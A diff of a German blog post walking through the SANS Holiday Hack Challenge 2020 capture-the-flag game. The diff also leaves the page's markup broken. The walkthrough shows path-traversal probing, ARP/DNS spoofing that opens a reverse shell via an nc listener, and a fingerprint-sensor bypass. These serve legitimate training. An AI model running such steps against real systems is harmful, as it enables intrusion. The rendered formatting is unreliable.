@@ -7,9 +7,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Matthias Altmann">
-<meta name="description" content="SANS Holiday Hack Challenge 2020 / Writeup">
+<meta name="description" content="SANS Holiday Hack Challenge 2020 Writeup / Vollständiger Walktrough">
 
-<title>SANS Holiday Hack Challenge 2020</title>
+<title>SANS Holiday Hack Challenge 2020 Writeup</title>
 
 <!-- Bootstrap core CSS -->
 <link href="/blog/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
@@ -91,9 +91,9 @@
         <div class="row">
             <div class="col-lg-8 col-md-10 mx-auto">
                 <div class="page-heading">
-                    <h1>SANS Holiday Hack Challenge 2020</h1>
+                    <h1>SANS Holiday Hack Challenge 2020 Writeup</h1>
                     
-                    <h2 class="subheading">Writeup</h2>
+                    <h2 class="subheading">Vollständiger Walktrough</h2>
                     
                     
                     <span class="meta">Posted on January 11, 2021</span>
@@ -112,7 +112,7 @@
         <nav id="sidebar" class="sidebar-wrapper active">
             <div class="sidebar-header">
                 <h3>Inhaltsverzeichnis</h3>
-                <h4>SANS Holiday Hack Challenge 2020</h4>
+                <h4>SANS Holiday Hack Challenge 2020 Writeup</h4>
             </div>
 
             <ul class="list-unstyled components">
@@ -186,150 +186,10 @@
 </li>
 </ul>
 </li>
-<li class="toc-entry toc-h2">
-<a href="#7---solve-the-sleighs-can-d-bus-problem">7 - Solve the Sleigh’s CAN-D-Bus Problem</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#aufgabe-6">Aufgabe</a></li>
-<li class="toc-entry toc-h3"><a href="#ort-6">Ort</a></li>
-<li class="toc-entry toc-h3"><a href="#m%C3%B6gliche-l%C3%B6sung-6">Mögliche Lösung</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h2">
-<a href="#8---broken-tag-generator">8 - Broken Tag Generator</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#aufgabe-7">Aufgabe</a></li>
-<li class="toc-entry toc-h3"><a href="#ort-7">Ort</a></li>
-<li class="toc-entry toc-h3"><a href="#m%C3%B6gliche-l%C3%B6sung-7">Mögliche Lösung</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#9---arp-shenanigans">9 - ARP Shenanigans</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#aufgabe-8">Aufgabe</a></li>
-<li class="toc-entry toc-h3">
-<a href="#ort-8">Ort</a>
-<ul>
-<li class="toc-entry toc-h4"><a href="#m%C3%B6gliche-l%C3%B6sung-8">Mögliche Lösung</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#10---defeat-fingerprint-sensor">10 - Defeat Fingerprint Sensor</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#aufgabe-9">Aufgabe</a></li>
-<li class="toc-entry toc-h3"><a href="#ort-9">Ort</a></li>
-<li class="toc-entry toc-h3"><a href="#m%C3%B6gliche-l%C3%B6sung-9">Mögliche Lösung</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#11a---naughty--nice-list-with-blockchain-part-1">11a - Naughty / Nice List with Blockchain Part 1</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#aufgabe-10">Aufgabe</a></li>
-<li class="toc-entry toc-h3"><a href="#ort-10">Ort</a></li>
-<li class="toc-entry toc-h3"><a href="#m%C3%B6gliche-l%C3%B6sung-10">Mögliche Lösung</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#11b---naughty--nice-list-with-blockchain-part-2">11b - Naughty / Nice List with Blockchain Part 2</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#m%C3%B6gliche-l%C3%B6sung-11">Mögliche Lösung</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2"><a href="#ende-des-spiels">Ende des Spiels</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h1">
-<a href="#terminal-challenges">Terminal Challenges</a>
-<ul>
-<li class="toc-entry toc-h2">
-<a href="#entry">Entry</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#unescape-tmux">Unescape tmux</a></li>
-<li class="toc-entry toc-h3"><a href="#kringle-kiosk">Kringle Kiosk</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#dining-room">Dining Room</a>
-<ul>
-<li class="toc-entry toc-h3">
-<a href="#elf-coder">Elf Coder</a>
-<ul>
-<li class="toc-entry toc-h4"><a href="#level-0">Level 0</a></li>
-<li class="toc-entry toc-h4"><a href="#level-1">Level 1</a></li>
-<li class="toc-entry toc-h4"><a href="#level-2">Level 2</a></li>
-<li class="toc-entry toc-h4"><a href="#level-3">Level 3</a></li>
-<li class="toc-entry toc-h4"><a href="#level-4">Level 4</a></li>
-<li class="toc-entry toc-h4"><a href="#level-5">Level 5</a></li>
-<li class="toc-entry toc-h4"><a href="#level-6">Level 6</a></li>
-<li class="toc-entry toc-h4"><a href="#level-7">Level 7</a></li>
-<li class="toc-entry toc-h4"><a href="#level-8">Level 8</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#kitchen">Kitchen</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#336-kbps">33.6 Kbps</a></li>
-<li class="toc-entry toc-h3"><a href="#redis-investigation">Redis Investigation</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#courtyard">Courtyard</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#linux-primer">Linux Primer</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#workshop">Workshop</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#sort-o-matic-regex-game">Sort-o-matic Regex Game</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#talks-lobby">Talks Lobby</a>
-<ul>
-<li class="toc-entry toc-h3">
-<a href="#speaker-unprep">Speaker UNPrep</a>
-<ul>
-<li class="toc-entry toc-h4"><a href="#door">Door</a></li>
-<li class="toc-entry toc-h4"><a href="#lights">Lights</a></li>
-<li class="toc-entry toc-h4"><a href="#automat">Automat</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h3"><a href="#snowball-fight">Snowball Fight</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h2">
-<a href="#netwars">Netwars</a>
-<ul>
-<li class="toc-entry toc-h3">
-<a href="#scapy-prepper">Scapy Prepper</a>
-<ul>
-<li class="toc-entry toc-h4"><a href="#task-0">Task 0</a></li>
-<li class="toc-entry toc-h4"><a href="#task-1">Task 1</a></li>
-<li class="toc-entry toc-h4"><a href="#task-2">Task 2</a></li>
-<li class="toc-entry toc-h4"><a href="#task-3">Task 3</a></li>
-<li class="toc-entry toc-h4"><a href="#task-4">Task 4</a></li>
-<li class="toc-entry toc-h4"><a href="#task-5">Task 5</a></li>
-<li class="toc-entry toc-h4"><a href="#task-6">Task 6</a></li>
-<li class="toc-entry toc-h4"><a href="#task-7">Task 7</a></li>
-<li class="toc-entry toc-h4"><a href="#task-8">Task 8</a></li>
-<li class="toc-entry toc-h4"><a href="#task-9">Task 9</a></li>
-<li class="toc-entry toc-h4"><a href="#task-10">Task 10</a></li>
-<li class="toc-entry toc-h4"><a href="#task-11">Task 11</a></li>
-<li class="toc-entry toc-h4"><a href="#task-12">Task 12</a></li>
-<li class="toc-entry toc-h4"><a href="#task-13">Task 13</a></li>
-<li class="toc-entry toc-h4"><a href="#task-14">Task 14</a></li>
-<li class="toc-entry toc-h4"><a href="#task-15">Task 15</a></li>
-</ul>
-</li>
-<li class="toc-entry toc-h3"><a href="#can-bus-investigation">CAN-Bus Investigation</a></li>
-</ul>
-</li>
-</ul>
-</li>
+<li class="toc-entry toc-h1"><a href="#something-went-wrong">Something went wrong!</a></li>
+<li class="toc-entry toc-h1"><a href="#something-went-wrong-1">Something went wrong!</a></li>
 </ul>
             </ul>
 
@@ -346,7 +206,7 @@
                 <h1 id="einleitung">
 <a class="anchor" href="#einleitung" aria-hidden="true"><span class="octicon octicon-link"></span></a>Einleitung</h1>
 
-<p>Zunächst einmal möchen den Machern dieses unglaublichen Events danken.
+<p>Zunächst einmal möchte ich den Machern dieses unglaublichen Events danken.
 Auch 2020 wurde hier wieder großartige Arbeit geleistet. 
 Es ist jedes Jahr unfassbar wie packend und lehrreich das Ganze ist.</p>
 
@@ -489,13 +349,15 @@ North Pole: The Frostiest Place on Earth
 <h3 id="mögliche-lösung-2">
 <a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h3>
 
-<p>Die Lösung ist <a href="https://www.systutorials.com/docs/linux/man/1-unar/" target="_blank" rel="noopener noreferrer">unar</a>
+<p>Zunächst musst du die Daten der Datei extrahieren.</p>
+
+<p>Eine Lösung ist <a href="https://www.systutorials.com/docs/linux/man/1-unar/" target="_blank" rel="noopener noreferrer">unar</a>
 zu verwenden um an die Ressourcen der Datei santa-shop.exe zu kommen. 
 Hier befindet sich unter einem Verzeichnis mit Unicode-Zeichen ein Archiv app-64.7z.</p>
 
 <p><img src="/blog/assets/img/hhc/2020/steps_1_obj_3.png" style="display:block;margin-left:auto;margin-right:auto" width="100%" alt="location objective 3"></p>
 
-<p>Wenn man dieses Archiv mit 7z entpackt kommst du an eine app.asar, die in einem Format für Electtron Apps gepackt ist.
+<p>Wenn man dieses Archiv mit 7z entpackt kommst du an eine app.asar, die in einem Format für Electron Apps gepackt ist.
 Dieses Format kann mit asar wiederum entpackt werden. Das Github Projekt hierzu findet sich unter 
 <a href="https://github.com/electron/asar" target="_blank" rel="noopener noreferrer">https://github.com/electron/asar</a></p>
 
@@ -733,6 +595,8 @@ pm3 --&gt; lf hid read
   <p>How many distinct MITRE ATT&amp;CK techniques did Alice emulate?</p>
 </blockquote>
 
+<p>Du kannst folgenden Befehl nutzen um die verschiedenen Techniken anzeigen zu lassen:</p>
+
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| tstats count where index=* by index
 </code></pre></div></div>
 
@@ -748,7 +612,7 @@ pm3 --&gt; lf hid read
 | stats dc(technique)
 </code></pre></div></div>
 
-<p>Wenn Du als Weihnachtsmann eingeloggt bist kannst du das Ergebnis auch so überprüfen:
+<p>Wenn Du als Weihnachtsmann eingeloggt bist kannst du das Ergebnis über folgenden Link überprüfen:
 <a href="https://splunk.kringlecastle.com/de-DE/app/SA-kringleconsoc/search?sid=1608682982.3730" target="_blank" rel="noopener noreferrer">https://splunk.kringlecastle.com/de-DE/app/SA-kringleconsoc/search?sid=1608682982.3730</a></p>
 
 <p>Lösung:</p>
@@ -761,6 +625,11 @@ pm3 --&gt; lf hid read
 <blockquote>
   <p>What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</p>
 </blockquote>
+
+<p>Nutzend den gleichen Befehl wie zuvor:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| tstats count where index=* by index
+</code></pre></div></div>
 
 <p><img src="/blog/assets/img/hhc/2020/obj_6_2_solution.png" width="100%" alt="Objective 6 traininq question 2 solution"></p>
 
@@ -915,7 +784,7 @@ im Gegensatz zu Discovery.bat (Vorsicht Virenscanner schlagen bei den Payloads b
   <p>What is the name of the adversary group that Santa feared would attack KringleCon?</p>
 </blockquote>
 
-<p>Du bekommst im Chat nachdem du Frage 7 gelöst hast einen Base64-String:</p>
+<p>Du bekommst im Chat, nachdem du Frage 7 gelöst hast, einen Base64-String:</p>
 
 <p><code class="language-plaintext highlighter-rouge">7FXjP1lyfKbyDK/MChyf36h7</code></p>
 
@@ -925,9 +794,13 @@ im Gegensatz zu Discovery.bat (Vorsicht Virenscanner schlagen bei den Payloads b
 
 <p>Für den Algorithmus verwendete ich <a href="https://stackoverflow.com/questions/29607753/how-to-decrypt-a-file-that-encrypted-with-rc4-using-python" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/29607753/how-to-decrypt-a-file-that-encrypted-with-rc4-using-python</a>.</p>
 
-<p>Füge hier als <code class="language-plaintext highlighter-rouge">&lt;encrypted file contents&gt;</code> <code class="language-plaintext highlighter-rouge">7FXjP1lyfKbyDK/MChyf36h7</code> ein.</p>
+<p>Füge hier als</p>
 
-<p>Daraus ergibt sich dann:</p>
+<encrypted file="" contents="">`
+
+`7FXjP1lyfKbyDK/MChyf36h7` ein.
+
+Daraus ergibt sich dann:
 
 <pre><code class="bash">cat rc4-decode.py</code></pre>
 
@@ -956,181 +829,136 @@ for char in data:
 print ''.join(out)
 </code></pre>
 
-<p>Das Ergebnis bekommst Du dann mit (Achtung python 2 !)</p>
+Das Ergebnis bekommst Du dann mit (Achtung python 2 !)
 
 <pre><code class="bash">python rc4-decode
 The Lollipop Guild</code></pre>
 
-<p>Lösung:</p>
+Lösung:
 
-<p><strong>The Lollipop Guild</strong></p>
+**The Lollipop Guild**
 
-<h2 id="7---solve-the-sleighs-can-d-bus-problem">
-<a class="anchor" href="#7---solve-the-sleighs-can-d-bus-problem" aria-hidden="true"><span class="octicon octicon-link"></span></a>7 - Solve the Sleigh’s CAN-D-Bus Problem</h2>
+## 7 - Solve the Sleigh's CAN-D-Bus Problem
 
-<h3 id="aufgabe-6">
-<a class="anchor" href="#aufgabe-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Aufgabe</h3>
+### Aufgabe
 
-<p><img src="/blog/assets/img/hhc/2020/intro_obj_7.png" width="100%" alt="Introduction objective 7"></p>
+<img src="/blog/assets/img/hhc/2020/intro_obj_7.png" width="100%" alt="Introduction objective 7">
 
-<h3 id="ort-6">
-<a class="anchor" href="#ort-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Ort</h3>
+### Ort
 
-<p>Netwars</p>
+Netwars
 
-<p><img src="/blog/assets/img/hhc/2020/pic_obj_7.png" style="display:block;margin-left:auto;margin-right:auto" width="40%" alt="location objective 7"></p>
+<img src="/blog/assets/img/hhc/2020/pic_obj_7.png" style="display:block;margin-left:auto;margin-right:auto" width="40%" alt="location objective 7">
 
-<h3 id="mögliche-lösung-6">
-<a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-6" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h3>
+### Mögliche Lösung
 
-<p>Um herauszufinden, was schief läuft versuche zu verstehen welche ID Codes 
-was bedeuten.</p>
+Um herauszufinden, was schief läuft versuche zu verstehen welche ID Codes 
+was bedeuten.
 
-<p>Dafür erstellte ich eine Tabelle mit IDs zu Werte / Wertebereichen.</p>
+Dafür erstellte ich eine Tabelle mit IDs zu Werte / Wertebereichen.
 
-<p>Dann betätige die einzelnen Möglichkeiten und werte die Veränderungen in der Ausgabe.</p>
+Dann betätige die einzelnen Möglichkeiten und werte die Veränderungen in der Ausgabe.
 
-<p>Um die Daten leicht zu erfassen kannst du ein Screenshot-Tool verwenden, das 
+Um die Daten leicht zu erfassen kannst du ein Screenshot-Tool verwenden, das 
 den Bildschirm einfriert. Die Screenshots kannst du dann auch verwenden um leichter
-die Veränderungen innerhalb der IDs zu beobachten.</p>
+die Veränderungen innerhalb der IDs zu beobachten.
 
-<p>Das ergab:</p>
+Das ergab:
 
-<table>
-  <thead>
-    <tr>
-      <th style="text-align: center">ID Code</th>
-      <th style="text-align: center">System</th>
-      <th style="text-align: center">Value(s)</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align: center">244</td>
-      <td style="text-align: center">Beschleuniger</td>
-      <td style="text-align: center"> </td>
-    </tr>
-    <tr>
-      <td style="text-align: center">02A</td>
-      <td style="text-align: center">Start Stop</td>
-      <td style="text-align: center">00FF00</td>
-    </tr>
-    <tr>
-      <td style="text-align: center">019</td>
-      <td style="text-align: center">Steuerung</td>
-      <td style="text-align: center">In Hex , negative Werte im Einerkomplement</td>
-    </tr>
-    <tr>
-      <td style="text-align: center">080</td>
-      <td style="text-align: center">Bremsen</td>
-      <td style="text-align: center">in hex</td>
-    </tr>
-    <tr>
-      <td style="text-align: center">198</td>
-      <td style="text-align: center">(Un)Lock Tür</td>
-      <td style="text-align: center">Lock:00000000 Unlock: 000F000000</td>
-    </tr>
-  </tbody>
-</table>
+| ID Code | System        |  Value(s)                                  |
+|:-------:|:-------------:|:------------------------------------------:|
+| 244     | Beschleuniger |                                            |
+| 02A     | Start Stop    | 00FF00                                     |
+| 019     | Steuerung     | In Hex , negative Werte im Einerkomplement |  
+| 080     | Bremsen       | in hex                                      |
+| 198     | (Un)Lock Tür  | Lock:00000000 Unlock: 000F000000            |
 
-<p>Am Ende ergab meine Analyse folgenden Filter:</p>
+Am Ende ergab meine Analyse folgenden Filter:
 
-<ul>
-  <li>
-    <p>080 Less 000000</p>
-  </li>
-  <li>
-    <p>19B Equals F2057</p>
-  </li>
-</ul>
+- 080 Less 000000
 
-<p><img src="/blog/assets/img/hhc/2020/obj_7_solution.png" width="100%" alt="objective 7 solution"></p>
+- 19B Equals F2057
 
-<h2 id="8---broken-tag-generator">
-<a class="anchor" href="#8---broken-tag-generator" aria-hidden="true"><span class="octicon octicon-link"></span></a>8 - Broken Tag Generator</h2>
+<img src="/blog/assets/img/hhc/2020/obj_7_solution.png" width="100%" alt="objective 7 solution">
 
-<h3 id="aufgabe-7">
-<a class="anchor" href="#aufgabe-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Aufgabe</h3>
+## 8 - Broken Tag Generator
 
-<p><img src="/blog/assets/img/hhc/2020/intro_obj_8.png" width="100%" alt="Introduction objective 8"></p>
+### Aufgabe
 
-<h3 id="ort-7">
-<a class="anchor" href="#ort-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Ort</h3>
+<img src="/blog/assets/img/hhc/2020/intro_obj_8.png" width="100%" alt="Introduction objective 8">
 
-<p>Wrapping Room</p>
+### Ort
 
-<p><img src="/blog/assets/img/hhc/2020/pic_obj_8.png" style="display:block;margin-left:auto;margin-right:auto" width="50%" alt="location objective 8"></p>
+Wrapping Room
 
-<h3 id="mögliche-lösung-7">
-<a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-7" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h3>
+<img src="/blog/assets/img/hhc/2020/pic_obj_8.png" style="display:block;margin-left:auto;margin-right:auto" width="50%" alt="location objective 8">
 
-<p>Zunächst enumeriere die Seite:</p>
+### Mögliche Lösung
+
+Zunächst enumeriere die Seite:
 
 <pre><code class="bash">dirsearch.py -u https://tag-generator.kringlecastle.com/ -e all</code></pre>
 
-<p>501 ist der HTTP Statuscode für:</p>
+501 ist der HTTP Statuscode für:
 
-<p>“The server does not support the functionality required to fulfill the request”</p>
+"The server does not support the functionality required to fulfill the request"
 
-<p>Wenn du dir die HTML-Rückmeldung anschaust erhältst du:</p>
+Wenn du dir die HTML-Rückmeldung anschaust erhältst du:
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -s -L https://tag-generator.kringlecastle.com/image
+```
+curl -k -s -L https://tag-generator.kringlecastle.com/image
 
-&lt;h1&gt;Something went wrong!&lt;/h1&gt;
+<h1>
+<a class="anchor" href="#something-went-wrong" aria-hidden="true"><span class="octicon octicon-link"></span></a>Something went wrong!</h1>
 
-&lt;p&gt;Error in /app/lib/app.rb: ID is missing!&lt;/p&gt;
-</code></pre></div></div>
+<p>Error in /app/lib/app.rb: ID is missing!</p>
+```
 
-<p>Dem kommen wir nach und liefern eine ID mit:</p>
+Dem kommen wir nach und liefern eine ID mit:
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -k -s -L https://tag-generator.kringlecastle.com/image\&amp;id\=1
-&lt;h1&gt;Something went wrong!&lt;/h1&gt;
+```
+curl -k -s -L https://tag-generator.kringlecastle.com/image\&amp;id\=1
+<h1>
+<a class="anchor" href="#something-went-wrong-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Something went wrong!</h1>
 
-&lt;p&gt;Error in /app/lib/app.rb: Route not found&lt;/p&gt;
-</code></pre></div></div>
+<p>Error in /app/lib/app.rb: Route not found</p>
+```
 
-<p>Ok, du hast nun eine ID-Variable. Versuche einen Path-Traversal-Angriff durchzuführen.</p>
+Ok, du hast nun eine ID-Variable. Versuche einen Path-Traversal-Angriff durchzuführen.
 
-<p><img src="/blog/assets/img/hhc/2020/obj_8_step_2.png" width="100%" alt="objective 8 step 2 check path traversal"></p>
+<img src="/blog/assets/img/hhc/2020/obj_8_step_2.png" width="100%" alt="objective 8 step 2 check path traversal">
 
-<p>Damit erhälst du Zugriff auf den Code.</p>
+Damit erhälst du Zugriff auf den Code.
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499007090" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499007090" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Video description at <a href="https://player.vimeo.com/video/499007090" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499007090</a></p>
 
-<p>Solution:</p>
+Solution:
 
-<p><strong>JackFrostWasHere</strong></p>
+**JackFrostWasHere**
 
-<h2 id="9---arp-shenanigans">
-<a class="anchor" href="#9---arp-shenanigans" aria-hidden="true"><span class="octicon octicon-link"></span></a>9 - ARP Shenanigans</h2>
+## 9 - ARP Shenanigans
 
-<h3 id="aufgabe-8">
-<a class="anchor" href="#aufgabe-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Aufgabe</h3>
+### Aufgabe
 
-<p><img src="/blog/assets/img/hhc/2020/intro_obj_9.png" width="100%" alt="Introduction objective 9"></p>
+<img src="/blog/assets/img/hhc/2020/intro_obj_9.png" width="100%" alt="Introduction objective 9">
 
-<h3 id="ort-8">
-<a class="anchor" href="#ort-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Ort</h3>
+### Ort
 
-<p>NetWars</p>
+NetWars
 
-<p><img src="/blog/assets/img/hhc/2020/pic_obj_9.png" style="display:block;margin-left:auto;margin-right:auto" width="50%" alt="location objective 8"></p>
+<img src="/blog/assets/img/hhc/2020/pic_obj_9.png" style="display:block;margin-left:auto;margin-right:auto" width="50%" alt="location objective 8">
 
-<h4 id="mögliche-lösung-8">
-<a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-8" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h4>
+#### Mögliche Lösung
 
-<p>Erzeuge 5 tmux-Fenster (Ctrl+B C).</p>
+Erzeuge 5 tmux-Fenster (Ctrl+B C).
 
-<p>Erstes tmux-Fenster:</p>
+Erstes tmux-Fenster:
 
 <pre><code class="bash">tcpdump -nn -i any</code></pre>
 
-<p>Zweites tmux-Fenster:</p>
+Zweites tmux-Fenster:
 
 <pre><code class="bash">cd scripts
 :&gt; dns_resp.py
@@ -1155,86 +983,72 @@ chmod u+x cdb.sh
 ./cdb.sh
 </code></pre>
 
-<p>Drittes tmux-Fenster:</p>
+Drittes tmux-Fenster:
 
 <pre><code class="bash">cd scripts/
 ./dns_resp.py
 </code></pre>
 
-<p>Viertes tmux-Fenster:</p>
+Viertes tmux-Fenster:
 
 <pre><code class="bash">nc -nlvp 8080</code></pre>
 
-<p>Fünftes tmux-Fenster:</p>
+Fünftes tmux-Fenster:
 
 <pre><code class="bash">cd scripts/
 ./arp_resp.py</code></pre>
 
-<p>Viertes tmux-Fenster:</p>
+Viertes tmux-Fenster:
 
-<p>Eine Reverse-Shell sollte erzeugt worden sein.</p>
+Eine Reverse-Shell sollte erzeugt worden sein.
 
 <pre><code class="bash">python3 -c "import pty; pty.spawn("/bin/bash")'
 cat NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt | less
 </code></pre>
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499182451" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499182451" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Videobeschreibung unter <a href="https://player.vimeo.com/video/499182451" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499182451</a></p>
 
-<p>Lösung:</p>
+Lösung:
 
-<p><strong>Tanta Kringle</strong></p>
+**Tanta Kringle**
 
-<h2 id="10---defeat-fingerprint-sensor">
-<a class="anchor" href="#10---defeat-fingerprint-sensor" aria-hidden="true"><span class="octicon octicon-link"></span></a>10 - Defeat Fingerprint Sensor</h2>
+## 10 - Defeat Fingerprint Sensor
 
-<h3 id="aufgabe-9">
-<a class="anchor" href="#aufgabe-9" aria-hidden="true"><span class="octicon octicon-link"></span></a>Aufgabe</h3>
+### Aufgabe
 
-<p><img src="/blog/assets/img/hhc/2020/intro_obj_10.png" width="100%" alt="Introduction objective 10"></p>
+<img src="/blog/assets/img/hhc/2020/intro_obj_10.png" width="100%" alt="Introduction objective 10">
 
-<h3 id="ort-9">
-<a class="anchor" href="#ort-9" aria-hidden="true"><span class="octicon octicon-link"></span></a>Ort</h3>
+### Ort
 
-<p>Santavator</p>
+Santavator
 
-<h3 id="mögliche-lösung-9">
-<a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-9" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h3>
+### Mögliche Lösung
 
-<p>Setze einen Breakpoint und füge das Token ‘besanta’ hinzu um den Fingerabdrucksensor zu umgehen:</p>
+Setze einen Breakpoint und füge das Token 'besanta' hinzu um den Fingerabdrucksensor zu umgehen:
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499151055" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
+<div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/499151055" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></div>
 <script src="https://player.vimeo.com/api/player.js"></script>
-
 <p>Videobechreibung unter <a href="https://player.vimeo.com/video/499151055" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499151055</a></p>
 
-<h2 id="11a---naughty--nice-list-with-blockchain-part-1">
-<a class="anchor" href="#11a---naughty--nice-list-with-blockchain-part-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>11a - Naughty / Nice List with Blockchain Part 1</h2>
+## 11a - Naughty / Nice List with Blockchain Part 1
 
-<h3 id="aufgabe-10">
-<a class="anchor" href="#aufgabe-10" aria-hidden="true"><span class="octicon octicon-link"></span></a>Aufgabe</h3>
+### Aufgabe
 
-<p><img src="/blog/assets/img/hhc/2020/intro_obj_11a.png" width="100%" alt="Introduction objective 11a"></p>
+<img src="/blog/assets/img/hhc/2020/intro_obj_11a.png" width="100%" alt="Introduction objective 11a">
 
-<h3 id="ort-10">
-<a class="anchor" href="#ort-10" aria-hidden="true"><span class="octicon octicon-link"></span></a>Ort</h3>
+### Ort
 
-<p>Santa’s Office</p>
+Santa's Office
 
-<p><img src="/blog/assets/img/hhc/2020/pic_obj_11.png" style="display:block;margin-left:auto;margin-right:auto" width="50%" alt="location objective 8"></p>
+<img src="/blog/assets/img/hhc/2020/pic_obj_11.png" style="display:block;margin-left:auto;margin-right:auto" width="50%" alt="location objective 8">
 
-<h3 id="mögliche-lösung-10">
-<a class="anchor" href="#m%C3%B6gliche-l%C3%B6sung-10" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mögliche Lösung</h3>
+### Mögliche Lösung
 
-<p>In dieser Aufgabe ging es darum ähnlich wie in der <a href="https://secf00tprint.github.io/blog/hhc/2020/writeup/de#snowball-fight">Snowball Fight Terminal Challenge</a>
+In dieser Aufgabe ging es darum ähnlich wie in der [Snowball Fight Terminal Challenge](https://secf00tprint.github.io/blog/hhc/2020/writeup/de#snowball-fight)
 den Zustand des Pseudozufallsgenerators aus bislang bekannten Zufallszahlen herzustellen und
-dann die nächsten Zahlen zu berechnen um letztendlich die Nonce an Block 130000 zu berechnen.</p>
+dann die nächsten Zahlen zu berechnen um letztendlich die Nonce an Block 130000 zu berechnen.
 
 <pre><code class="bash">cat analyze_nonces.py</code></pre>
 
@@ -1259,11 +1073,13 @@ print("129999", predictor.getrandbits(64))
 print("130000", predictor.getrandbits(64))
 </code></pre>
 
-<p><code class="language-plaintext highlighter-rouge">foundrands=[]</code> muss mit den Nonces aus der Blockchain befüllt werden.</p>
+
+`foundrands=[]` muss mit den Nonces aus der Blockchain befüllt werden.
 
 <pre><code class="bash">python3 analyze_nonces.py</code></pre>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+```
+...
 2538543693281192206
 15896979806300748684
 14120612108965687512
@@ -1282,12 +1098,12 @@ last known index: 129996
 129998 109892600914328301
 129999 9533956617156166628
 130000 6270808489970332317
-</code></pre></div></div>
+```
 
-<p>Am Ende berechnest du noch den Hex-Wert.
-Das Ganze zusammengefasst ist dann:</p>
+Am Ende berechnest du noch den Hex-Wert.
+Das Ganze zusammengefasst ist dann:
 
